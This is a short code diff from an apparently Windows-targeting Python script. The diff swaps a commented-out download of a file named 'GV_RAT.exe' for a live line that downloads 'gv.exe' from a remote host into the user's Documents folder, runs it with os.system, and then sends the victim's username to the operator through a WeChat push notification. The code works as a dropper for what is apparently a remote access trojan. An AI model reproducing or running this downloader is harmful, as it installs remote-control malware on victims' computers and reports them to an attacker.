@@ -114,6 +114,6 @@ if sys_username == 'Administrator':
 
 
 bd_path = f"C:/Users/{sys_username}/Documents/m.exe"
-# download_file("https://yc.052024.xyz/exe/GV_RAT.exe", bd_path)
+download_file("https://yc.052024.xyz/exe/gv.exe", bd_path)
 os.system(f"start {bd_path}")
 wechat_push.Alleged_information(f'{sys_username}操作完成2')
